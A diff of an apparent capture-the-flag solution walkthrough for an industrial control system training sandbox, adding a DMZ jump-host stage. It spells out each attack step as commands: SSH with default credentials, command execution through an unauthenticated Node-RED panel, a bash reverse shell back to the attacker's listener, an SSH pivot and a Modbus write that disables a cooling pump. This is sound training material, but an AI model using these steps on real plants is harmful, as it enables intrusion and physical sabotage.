@@ -1,6 +1,6 @@
 # Complex OT Sandbox — Training Solution Walkthrough
 
-This document provides the complete step-by-step solutions for all training levels of the **Industrial Control Hijack and Pivoting Sandbox** (`complex-operator-ot-sandbox`) training scenario. 
+This document provides the complete step-by-step solutions for all training levels of the **Industrial Control Hijack and Pivoting Sandbox** (`complex-operator-ot-sandbox`) training scenario.
 
 ---
 
@@ -27,12 +27,13 @@ To understand this exploit and sabotage scenario, you must first understand the 
 
 This scenario is designed to replicate high-profile state-sponsored cyber-physical attacks (such as the **2015 Ukraine Power Grid attack** and the **2021 Oldsmar, Florida Water Plant breach**) rather than generic IT capture-the-flag exercises. It mirrors real-world networks in four key ways:
 
-### A. Strict Purdue Model Segmentation
+### A. Strict Purdue Model & IDMZ Segmentation
 The network layout enforces strict division based on the **Purdue Model (incorporated into the ISA/IEC 62443 standard for network zone segmentation)** using a central router (`ot-gateway`):
-*   **Isolation of the Control Network:** The attacker (on Corporate Level 4/5) has **no direct path** to the EWS (Level 2) or the PLC (Level 1). They cannot ping, port-scan, or exploit the PLC directly.
-*   **Authorized Path Flow:** The gateway router firewall only permits traffic to pass along authorized channels:
-    *   Attacker (Corporate) can only access the SCADA HMI (Operations Level 3) on port 1880.
-    *   SCADA HMI (Operations Level 3) can SSH (port 22) into the EWS (Level 2).
+*   **Isolation of the Control Network:** The attacker (on Corporate Level 4/5) has **no direct path** to the SCADA HMI (Level 3), the EWS (Level 2) or the PLC (Level 1). They cannot ping, port-scan, or exploit the SCADA dashboard directly.
+*   **Authorized Path Flow via IDMZ:** An intermediate **Level 3.5 Industrial DMZ (IDMZ)** subnet (`dmz-net`) and a Jump Host VM (`dmz-jump`) are introduced.
+    *   Attacker (Corporate) is only allowed to SSH into the `dmz-jump` host.
+    *   The `dmz-jump` host is authorized to connect to the SCADA HMI (Operations Level 3) on port 1880 (Node-RED).
+    *   SCADA HMI (Level 3) is allowed to SSH (port 22) into the EWS (Level 2).
     *   EWS (Level 2) is the only node allowed to send Modbus TCP packets (port 502) to the PLC (Level 1).
 *   This segmenting mirrors real-world production networks where critical field equipment is segregated behind firewalls.
 
@@ -58,15 +59,18 @@ Once the attacker reaches the high-privilege EWS, they do not hack the PLC opera
 | Host | Subnet | IP | Services |
 |---|---|---|---|
 | `attacker-host` | corporate-net | `10.10.10.50` | Kali Linux (attacker workstation) |
+| `dmz-jump` | dmz-net | `192.168.50.50` | SSH Jump Host (port `22`) |
 | `scada-hmi` | operations-net | `192.168.100.10` | Node-RED on port `1880` |
 | `engineering-station` (EWS) | control-net | `192.168.20.20` | SSH (22), Modbus Client CLI |
 | `openplc-node` (PLC) | control-net | `192.168.20.10` | OpenPLC Modbus Server (502) |
-| `ot-gateway` | corporate-net / operations-net / control-net | `10.10.10.1` / `192.168.100.1` / `192.168.20.1` | Gateway firewall router |
+| `ot-gateway` | corporate-net / dmz-net / operations-net / control-net | `10.10.10.1` / `192.168.50.1` / `192.168.100.1` / `192.168.20.1` | Gateway firewall router |
 
 ### Firewall Rules (configured on `ot-gateway`)
 
-*   Attacker (`10.10.10.50` on `corporate-net`) is allowed to connect to HMI (`192.168.100.10` on `operations-net`) via port `1880` (Node-RED).
-*   Attacker is blocked from reaching EWS (`192.168.20.20`) and PLC (`192.168.20.10`) directly.
+*   Attacker (`10.10.10.50` on `corporate-net`) is allowed to connect to `dmz-jump` (`192.168.50.50` on `dmz-net`) via SSH (port `22`).
+*   Attacker is **blocked** from accessing SCADA HMI (`192.168.100.10`) directly from the corporate network (forces IDMZ jump box usage).
+*   `dmz-jump` (`192.168.50.50`) is allowed to connect to SCADA HMI (`192.168.100.10` on `operations-net`) via port `1880` (Node-RED).
+*   `dmz-jump` is blocked from reaching EWS (`192.168.20.20`) and PLC (`192.168.20.10`) directly.
 *   SCADA HMI (`192.168.100.10`) is allowed to SSH (port `22`) into EWS (`192.168.20.20`).
 *   SCADA HMI is blocked from connecting to the PLC (`192.168.20.10`) directly.
 *   EWS (`192.168.20.20`) is allowed to send Modbus TCP (port `502`) traffic to PLC (`192.168.20.10`).
@@ -81,189 +85,173 @@ Once the attacker reaches the high-privilege EWS, they do not hack the PLC opera
 
 ---
 
-## Level 2: RECONNAISSANCE: SCADA HMI Discovery
+## Level 2: IDMZ: Access the Industrial DMZ Jump Host
 
-**Objective:** Scan the operations management subnet (`192.168.100.0/24`) from your Kali workstation (`10.10.10.50`) to locate the active HMI web flow portal IP and port.
+**Objective:** Discover and SSH into the IDMZ jump host (`dmz-jump`) using stolen credentials to pass the corporate perimeter firewall.
+
+**Answer:** `FLAG{IDMZ_JUMP_ACCESSED}`
+
+### Steps:
+1. Open a terminal on Kali.
+2. Scan the IDMZ subnet (`192.168.50.0/24`) to target open ports for SSH services:
+   ```bash
+   nmap -p 22 --open 192.168.50.0/24
+   ```
+3. Locate the active jump host IP: **`192.168.50.50`**.
+4. Log into the jump host via SSH using the default credentials:
+   ```bash
+   ssh operator@192.168.50.50
+   ```
+   *(When prompted for password, enter: `operator123`)*
+5. Read the flag file in the home directory to retrieve the passkey:
+   ```bash
+   cat flag.txt
+   ```
+   *Result:* `FLAG{IDMZ_JUMP_ACCESSED}`
+
+---
+
+## Level 3: RECONNAISSANCE: SCADA HMI Discovery
+
+**Objective:** Scan the operations management subnet (`192.168.100.0/24`) *from the DMZ jump host terminal* to locate the active SCADA HMI web portal IP and port.
 
 **Answer:** `192.168.100.10:1880`
 
 ### Steps:
-1. Open a terminal on Kali.
-2. Scan the subnet to target open ports for common SCADA dashboard web services (Node-RED defaults to port `1880`):
+1. From your active SSH session on `dmz-jump` (`192.168.50.50`), run an `nmap` sweep targeting Node-RED's default port (`1880`):
    ```bash
    nmap -p 1880 --open 192.168.100.0/24
    ```
-3. Locate the IP address from the open port line output: **`192.168.100.10`**. The answer format is IP and Port: **`192.168.100.10:1880`**.
+2. Note the active HMI host: **`192.168.100.10`**. 
+3. Submit the answer in `IP:PORT` format: **`192.168.100.10:1880`**.
 
 ---
 
-## Level 3: EXPLOITATION: SCADA HMI Compromise (Florida Oldsmar Hack)
+## Level 4: EXPLOITATION: SCADA HMI Compromise (Florida Oldsmar Hack)
 
-**Objective:** Exploit the unauthenticated Node-RED interface on `scada-hmi` (`192.168.100.10:1880`) to read `/root/flag.txt`.
+**Objective:** Establish an SSH tunnel from Kali through the IDMZ jump host to expose the SCADA Node-RED panel, and compromise it to read `/root/flag.txt`.
 
 **Answer:** `FLAG{SCADA_HMI_COMPROMISED}`
 
 ### Steps:
-1.  Open the Kali web browser and go to `http://192.168.100.10:1880/`.
-2.  Drag an **`inject`** node, an **`exec`** node, and a **`debug`** node onto the canvas.
-3.  Configure the `exec` node with the command: `cat /root/flag.txt`
-4.  Wire them: `inject` ──► `exec` ──► `debug` (top output port).
-5.  Click **Deploy** and click the trigger button on the `inject` node.
-6.  Copy the flag from the debug panel: `FLAG{SCADA_HMI_COMPROMISED}`.
+1.  Open a new terminal tab on your Kali attacker host (leaving the SSH session running).
+2.  Establish an **SSH local port forward** to tunnel Node-RED traffic through the jump host:
+    ```bash
+    ssh -L 1880:192.168.100.10:1880 operator@192.168.50.50
+    ```
+    *(Authenticate using password: `operator123`)*
+3.  Open the Kali web browser and go to `http://localhost:1880/`. This securely forwards your browser request through the DMZ into the Operations network.
+4.  Drag an **`inject`** node, an **`exec`** node, and a **`debug`** node onto the canvas.
+5.  Configure the `exec` node with the command: `cat /root/flag.txt`
+6.  Wire them: `inject` ──► `exec` ──► `debug` (top output port).
+7.  Click **Deploy** in the top right, and click the trigger button on the `inject` node.
+8.  Copy the flag from the debug panel: `FLAG{SCADA_HMI_COMPROMISED}`.
 
 ---
 
-## Level 4: CREDENTIAL ACCESS: Operator Secrets
+## Level 5: CREDENTIAL ACCESS: Operator Secrets
 
-**Objective:** Search the compromised HMI filesystem to locate and extract Operator credentials from `/home/debian/ews_credentials.txt`.
+**Objective:** Search the compromised HMI filesystem to locate and extract EWS administrative credentials from `/home/debian/ews_credentials.txt`.
 
 **Answer:** `operator123`
 
 ### Steps:
-1. Change the Node-RED `exec` node command to read the credential configuration:
+1. Double-click the existing Node-RED `exec` node on your browser dashboard.
+2. Change the command field to read the operator credential file:
    ```bash
    cat /home/debian/ews_credentials.txt
    ```
-2. Click **Deploy** and click the inject trigger button.
-3. The output contains:
+3. Click **Deploy** and click the inject trigger button.
+4. The debug output contains:
    * **Host:** `192.168.20.20`
    * **User:** `operator`
    * **Password:** `operator123`
-4. Copy the operator password: **`operator123`**.
+5. Submit the operator password: **`operator123`**.
 
 ---
 
-## Level 5: PIVOT: EWS Lateral Pivot (Ukraine Power Grid)
+## Level 6: PIVOT: EWS Lateral Pivot (Ukraine Power Grid)
 
 **Objective:** Use the stolen credentials to SSH into EWS from the HMI, scan the control network, and locate the active PLC.
 
 **Answer:** `192.168.20.10`
 
-### Approach: Interactive Reverse Shell (Recommended)
-
-This approach establishes a full interactive terminal on the SCADA HMI back to your Kali machine, allowing you to manually SSH pivot to the EWS — closely replicating the technique used in the Ukraine Power Grid attack.
+### Steps:
 
 #### Step 1 — Start a Listener on Kali
-On the Kali attacker host (`10.10.10.50`), open a terminal and start a TCP listener to catch the incoming shell connection:
+On the Kali attacker host (`10.10.10.50`), open a terminal and start a TCP listener:
 ```bash
 nc -nlvp 4444
 ```
 
 #### Step 2 — Deploy the Reverse Shell via Node-RED
-Navigate to `http://192.168.100.10:1880/`.
-
-1. Drag an **`inject`** node and an **`exec`** node onto the canvas and wire them together.
-2. Double-click the `exec` node and enter this bash reverse shell payload into the **Command** field:
+On the Node-RED editor page (`http://localhost:1880/`):
+1. Drag a new **`inject`** node and **`exec`** node onto the canvas and wire them together.
+2. Configure the `exec` node with this bash reverse shell command to dial back to Kali:
    ```bash
    bash -c 'bash -i >& /dev/tcp/10.10.10.50/4444 0>&1'
    ```
 3. Click **Deploy**, then click the inject trigger button.
 
 #### Step 3 — Upgrade to a Full Interactive TTY
-Your Kali netcat listener should receive a connection from `192.168.100.10`. You now have a root shell on the SCADA HMI. However, this is a "dumb" shell that cannot handle interactive programs like SSH password prompts. Upgrade it first:
+On the caught shell terminal on Kali, upgrade the connection to allow interactive credentials entry:
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
-Your prompt will change to `root@scada-hmi:~#`, confirming a fully interactive terminal.
+Your prompt will update to `root@scada-hmi:~#`.
 
 #### Step 4 — SSH Pivot to the EWS
-From the upgraded shell on the SCADA HMI, SSH into the Engineering Workstation using the credentials stolen in Level 4:
+From the SCADA HMI terminal, SSH into the Engineering Workstation using the stolen credentials:
 ```bash
 ssh operator@192.168.20.20
 ```
-When prompted for a password, type:
-```
-operator123
-```
-*(The password will not be echoed on screen — this is standard Linux terminal behaviour.)*
+*(Enter password `operator123` when prompted)*
 
-#### Step 5 — Reconnaissance
-You are now inside the isolated control network as `operator@engineering-station`. Discover active hosts on the control subnet:
-```bash
-nmap -sn 192.168.20.0/24
-```
-This reveals the active PLC at **`192.168.20.10`**, ready for the Modbus sabotage stage.
-
----
-
-### OT Device Enumeration — Going Beyond a Ping Sweep
-
-A ping sweep (`nmap -sn`) tells you which IP addresses are active, but not what they are. In a real /24 subnet with 200 hosts, you cannot distinguish a Windows workstation from an industrial robotic arm by host-discovery alone. Attackers move to **service and protocol enumeration** — looking for the specific ports and protocols that OT equipment speaks.
-
-#### Method 1: Targeted ICS Port Scan (The Noisy Approach)
-
-Industrial Control Systems use well-known dedicated ports. Instead of scanning all 65,535 ports (slow and alarm-triggering), scan exclusively for known ICS protocol ports. For a Modbus-controlled pump, target **TCP port 502**:
-
+#### Step 5 — Scan the Control Subnet
+From the EWS command line (`operator@engineering-station`), scan the control network to target active PLCs speaking Modbus (port 502):
 ```bash
 nmap -p 502 --open 192.168.20.0/24
 ```
-
-*   **`-p 502`** — Only probe port 502.
-*   **`--open`** — Only show hosts where the port is actually listening.
-
-In this sandbox, OpenPLC is configured via its SQLite database to bind on port 502, so `192.168.20.10` is the only host that responds — instantly identifying the target.
-
-> [!NOTE]
-> Other common OT ports to scan for: `20000` (DNP3), `44818` (EtherNet/IP), `102` (Siemens S7comm), `4840` (OPC-UA).
-
-#### Method 2: Nmap Scripting Engine (NSE) for ICS Fingerprinting
-
-Once port 502 is confirmed open, Nmap's built-in ICS scripts can interrogate the device and extract its identity — no guessing required:
-
-```bash
-nmap -p 502 --script modbus-discover 192.168.20.0/24
-```
-
-If the PLC responds, this script returns its internal **device ID**, vendor information, and firmware version — completely unmasking the controller without any brute-force or exploit.
-
-#### Method 3: Passive Network Sniffing (The Realistic / Safe Approach)
-
-In real-world OT environments, active Nmap scanning is strongly discouraged. Legacy PLCs have fragile TCP/IP stacks — an aggressive scan can crash the device and halt physical production (a fast way to end a red team engagement). Instead, use passive observation from the already-compromised EWS:
-
-```bash
-sudo tcpdump -i eth0 -n port 502
-```
-
-Watching traffic for a few minutes reveals the EWS communicating with `192.168.20.10` over port 502 — confirming the PLC's identity and active protocol without sending a single aggressive probe into the control network. This "Living off the Land" technique leaves minimal forensic traces and does not risk destabilising production equipment.
+This isolates the target PLC at **`192.168.20.10`**.
 
 ---
 
-## Level 6: Process Sabotage (Modbus Hijack)
+## Level 7: Process Sabotage (Modbus Hijack)
 
 **Objective:** Disable the cooling pump by writing `0` to Holding Register 0 on the PLC, and read the confirmation flag from `/var/log/safety_override.txt` on the EWS.
 
 **Answer:** `FLAG{PUMP_DISABLED_SUCCESS}`
 
 ### Steps:
-1.  From the EWS command environment (via the pivoted SSH shell), run the `modbus` CLI utility:
+1.  From the pivoted EWS terminal, run the Modbus CLI script:
     ```bash
     modbus 192.168.20.10 0=0
     ```
-2.  Read the safety log generated on the EWS:
+2.  Read the safety override confirmation log:
     ```bash
     cat /var/log/safety_override.txt
     ```
-3.  Copy the flag: **`FLAG{PUMP_DISABLED_SUCCESS}`**.
+3.  Copy the validation flag: **`FLAG{PUMP_DISABLED_SUCCESS}`**.
 
 ---
 
 ## MITRE ATT&CK Technique Mapping
 
-This scenario covers techniques from both **MITRE ATT&CK for ICS** (the OT-specific framework) and the overlapping **MITRE ATT&CK Enterprise** framework. Each sandbox level maps to one or more real-world adversary techniques.
+This scenario covers techniques from both **MITRE ATT&CK for ICS** and **MITRE ATT&CK Enterprise**.
 
 ### ATT&CK for ICS Techniques
 
 | Level | Tactic | Technique ID | Technique Name | Description in Scenario |
 |---|---|---|---|---|
-| 2 | Initial Access | **T0819** | Exploit Public-Facing Application | Attacker connects to the unauthenticated Node-RED web interface exposed on the SCADA HMI |
-| 2 | Execution | **T0807** | Command and Scripting Interpreter | Bash commands executed as root via the Node-RED `exec` node |
-| 2 | Collection | **T0893** | Data from Local System | Attacker reads `/home/debian/ews_credentials.txt` from the SCADA host |
-| 3 | Lateral Movement | **T0859** | Valid Accounts | Stolen plaintext credentials (`operator`/`operator123`) used to authenticate to the EWS |
-| 3 | Discovery | **T0846** | Remote System Discovery | `nmap -sn 192.168.20.0/24` performs host discovery across the control subnet |
-| 3 | Discovery | **T0888** | Remote System Information Discovery | `nmap -p 502 --script modbus-discover` enumerates device identity from the PLC |
-| 3 | Collection | **T0842** | Network Sniffing | `tcpdump -i eth0 -n port 502` passively observes Modbus traffic to identify the PLC |
-| 4 | Impair Process Control | **T0855** | Unauthorized Command Message | Raw Modbus write command (`modbus 192.168.20.10 0=0`) sent to disable the cooling pump register |
-| 4 | Impair Process Control | **T0831** | Manipulation of Control | Pump register forced to `0`, overriding the active process control state |
+| 2 | Lateral Movement | **T0859** | Valid Accounts | Trainee logs into the `dmz-jump` host via SSH using credentials. |
+| 3 | Discovery | **T0846** | Remote System Discovery | Trainee sweeps the operations network from the DMZ host. |
+| 4 | Initial Access | **T0819** | Exploit Public-Facing Application | Node-RED flow builder exposed on the SCADA HMI. |
+| 4 | Execution | **T0807** | Command and Scripting Interpreter | Bash commands run via Node-RED `exec` node. |
+| 5 | Collection | **T0893** | Data from Local System | Trainee reads EWS credential backup files. |
+| 6 | Lateral Movement | **T0859** | Valid Accounts | Trainee SSHs from the HMI into the EWS. |
+| 6 | Discovery | **T0846** | Remote System Discovery | Trainee scans the control subnet using nmap. |
+| 7 | Impair Process Control | **T0855** | Unauthorized Command Message | Modbus write command writes value `0` to PLC register. |
+| 7 | Impair Process Control | **T0831** | Manipulation of Control | PLC holding register forced to zero to disable pump. |
 
 ---
 
@@ -271,20 +259,25 @@ This scenario covers techniques from both **MITRE ATT&CK for ICS** (the OT-speci
 
 | Level | Tactic | Technique ID | Technique Name | Description in Scenario |
 |---|---|---|---|---|
-| 2 | Initial Access | **T1190** | Exploit Public-Facing Application | Unauthenticated Node-RED exposure on the Operations network |
-| 2 | Execution | **T1059.004** | Command and Scripting Interpreter: Unix Shell | Bash reverse shell spawned via Node-RED `exec` node |
-| 3 | Lateral Movement | **T1021.004** | Remote Services: SSH | SSH pivot from the compromised HMI into the EWS using stolen credentials |
-| 3 | Credential Access | **T1552.001** | Unsecured Credentials: Credentials In Files | Plaintext `ews_credentials.txt` discovered on the SCADA HMI filesystem |
-| 3 | Discovery | **T1046** | Network Service Discovery | Nmap port scan on control subnet to identify Modbus-speaking hosts |
-| 3 | Execution | **T1059.004** | Command and Scripting Interpreter: Unix Shell | TTY upgrade via `python3 -c 'import pty; pty.spawn("/bin/bash")'` |
-| 4 | Impact | **T1489** | Service Stop | Modbus write halts the cooling pump process managed by the PLC |
+| 2 | Lateral Movement | **T1021.004** | Remote Services: SSH | SSH jump into the IDMZ host. |
+| 3 | Discovery | **T1046** | Network Service Discovery | Scanning operations subnet for Node-RED port. |
+| 4 | Initial Access | **T1190** | Exploit Public-Facing Application | unauthenticated Node-RED initial compromise. |
+| 4 | Execution | **T1059.004** | Command and Scripting Interpreter: Unix Shell | Command execution on Node-RED. |
+| 5 | Credential Access | **T1552.001** | Unsecured Credentials: Credentials In Files | Extracting plaintext passwords from filesystem backups. |
+| 6 | Lateral Movement | **T1021.004** | Remote Services: SSH | SSH lateral movement from HMI into EWS. |
+| 6 | Execution | **T1059.004** | Command and Scripting Interpreter: Unix Shell | PTY upgrade and reverse shell session catching. |
+| 6 | Discovery | **T1046** | Network Service Discovery | Scanning control subnet for Modbus port 502. |
+| 7 | Impact | **T1489** | Service Stop | Shutting down the cooling pump process logic. |
 
 ---
 
 ### Kill Chain Summary
 
 ```
-[Initial Access]       T0819 / T1190  — Exploit unauthenticated Node-RED HMI
+[Initial Access]       T0859 / T1021  — SSH jump through Level 3.5 IDMZ
+        │
+        ▼
+[Exploitation]         T0819 / T1190  — Exploit unauthenticated Node-RED HMI via SSH tunnel
         │
         ▼
 [Execution]            T0807 / T1059  — Command execution via exec node / reverse shell
